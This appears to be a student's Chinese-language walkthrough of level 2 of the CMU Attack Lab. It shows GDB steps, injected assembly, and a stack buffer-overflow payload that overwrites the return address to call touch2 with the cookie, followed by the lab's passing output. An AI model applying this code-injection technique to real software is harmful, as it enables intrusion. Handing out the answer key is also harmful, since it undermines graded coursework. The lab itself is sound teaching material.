## 获取几个重要值

1. 获取 getbuf stack frame 最后一行储存 buf 的开始地址为 `0x5561dc78`

   使用 GDB 进行如下调试拿到 getbuf 栈的最后一行储存 buf 的开始地址，即
   ```shell
   gdb target
   b getbuf
   r -q
   ni # 执行完 sub $28
   x $rsp # 查看 rsp 地址，输出 0x5561dc78
   ```

2. 获取 cookie 内容。这个内容是一个立即数 `0x59b997fa`


3. 获取 touch2 函数入口地址 `0x4017ec`
   ```shell
   gdb ctarget

   disas touch2
   ```

   得到
   ```s
   Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   ```

## 生成注入代码

`exploit2.s`

```s
pushq $0x4017ec
movq  $0x59b997fa, %rdi
retq
```

执行以下指令，生成注入字节

```shell
gcc -c  exploit2.s
objdump -d exploit2.o > exploit2.d
```

得到 `exploit2.d`

```text
exploit2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 ec 17 40 00       	pushq  $0x4017ec
   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   c:	c3                   	retq   
```


最后得到注入的指令字节是

```
68 ec 17 40 00 48 c7 c7
fa 97 b9 59 c3
```


我们需要填充整个 getbuf 的栈，同时把 ret 原来返回 test 的指令地址覆盖为我们注入代码的首地址。即 buf 的开始地址

```
68 ec 17 40 00 48 c7 c7
fa 97 b9 59 c3 aa aa aa
aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa /* padding 0x28 (40) bytes */
78 dc 61 55 00 00 00 00 /* 0x5561dca0 - 0x28 */
```

## 解题

```shell
./hex2raw < exploit2.txt > raw2.txt # 生成注入字节

./ctarget -q -i ./raw2.txt # 输入
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA 78 DC 61 55 00 00 00 00 
```
